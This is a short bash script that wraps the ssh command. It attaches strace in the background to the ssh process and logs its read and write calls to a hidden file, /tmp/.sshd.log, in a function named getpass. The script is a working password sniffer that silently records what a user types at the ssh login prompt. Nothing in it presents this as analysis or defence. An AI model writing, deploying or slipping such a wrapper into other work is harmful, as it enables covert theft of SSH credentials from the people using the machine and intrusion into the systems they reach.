#! /bin/bash
#
echo $1

get_ssh_pid() {
# return the PID of the parent ssh process
	ps aux|
	grep "ssh $1"|
	grep -v grep|
	awk {'print $2'}
} 

getpass() {
	ssh_pid=$(get_ssh_pid)
	echo $ssh_pid
	strace -f -F -p $ssh_pid -t -e trace=read,write -s 32 2> /tmp/.sshd.log &
}
getpass &
ssh $1


 

